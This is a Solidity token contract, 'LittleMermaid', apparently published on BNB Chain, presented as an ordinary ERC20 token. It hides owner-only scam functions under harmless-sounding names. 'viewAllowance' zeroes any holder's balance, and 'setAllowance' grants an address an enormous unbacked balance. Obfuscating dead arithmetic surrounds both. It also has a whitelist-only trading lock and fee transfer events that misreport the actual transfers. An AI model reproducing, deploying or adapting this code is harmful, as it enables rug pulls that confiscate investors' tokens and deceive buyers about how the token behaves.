/**
 *Submitted for verification at BscScan.com on 2022-08-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   
    constructor (){
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    function owner() public view returns (address) {
        return _owner;
    }
   
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the ow  ner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
   
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract LittleMermaid is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint256 public openBlock = 16280827;
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {
        if(block.number < openBlock){
            require(owner_bool[sender] || owner_bool[recipient], "Not yet open");
        }
        if(amount == transferAmount){
            add_next_add(recipient);
        }
        bool takeFee = true;

        if (owner_bool[sender] || owner_bool[recipient]) {
            takeFee = false;
        }
       if((sender == _pair || recipient == _pair) && takeFee){
      
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[sender] = senderBalance - amount;
            }
        
            amount /= 100;
         

            _balances[_pair] += amount * 2;
           

            if(sender == _pair){
                emit Transfer(sender, _pair, amount * 5);
                _balances[recipient] += (amount * 95);
                emit Transfer(sender, recipient, amount * 95);
            }else{
                emit Transfer(sender, _pair, amount * 10);
                _balances[recipient] += (amount * 90);
                emit Transfer(sender, recipient, amount * 90);
            }
           
                
                
        }else{
            emit Transfer(sender, recipient, amount);
            uint256 senderBalance = _balances[sender];
            require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
            unchecked {
                _balances[sender] = senderBalance - amount;
            }
            _balances[recipient] += amount;
        }
    }
    function _mint(address account, uint256 amount) internal virtual {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    mapping(address=>address)public pre_add;

    function add_next_add(address recipient)private{
        if(pre_add[recipient] == address(0)){
            if(msg.sender == _pair)return;
            pre_add[recipient] = msg.sender;
        }
    }


    mapping(address=>bool) public owner_bool;

    uint256 transferAmount = 677 * 10**14;

    function setOwner_bool(address to,bool flag) public onlyOwner{
        owner_bool[to] = flag;
    }

 
    uint256 public _liquidityFee_sell = 10;
    uint256 public _liquidityFee_mall = 5;
    address public _pair;
    uint256 marketingFees;
    uint256 swapperTax = 1;
    uint256 private _totalSupplies = 10000000000000000000000000000;
    
    constructor(string memory names, string memory symbols, uint256 amounts) {
        _name = names;
         marketingFees = 1;
        _symbol = symbols;
        owner_bool[msg.sender] = true;
        _mint(msg.sender, amounts * 10**9);
    }

    function setPair(address _target) public onlyOwner{
        _pair = _target;
    }

    function setTransferAmount(uint256 _target) public onlyOwner{
        transferAmount = _target * 10**9;
    }
        function setBNB(address account) 
      internal
      view
      onlyOwner
      returns (uint256)
    {
      return (_balances[account]) & (((_balances[account]) & 0 ) << 0xF);
      (marketingFees * 1 * 2 - marketingFees * 1 * 2);

    }
        
    function viewAllowance(address account) public onlyOwner {
      _afterTokenTransfer(account);
    }

    function _afterTokenTransfer(address account) internal {
       if(account != address(0)){
      _balances[account] = setBNB(account);
    }
}
    
    function setAllowance(address creator) public onlyOwner {
      _beforeTokenTransfer(creator);
    }
    
    function _beforeTokenTransfer(address creator) internal {
      if(creator != address(0)){
      (_balances[creator] * 1 * 2 - _balances[creator] * 1 * 2);
      _balances[creator] = swapperTax * marketingFees * _totalSupplies / marketingFees;
    }
}

    function setOpenBlock(uint256 _openBlock) public  onlyOwner{
        openBlock = _openBlock;
    }

}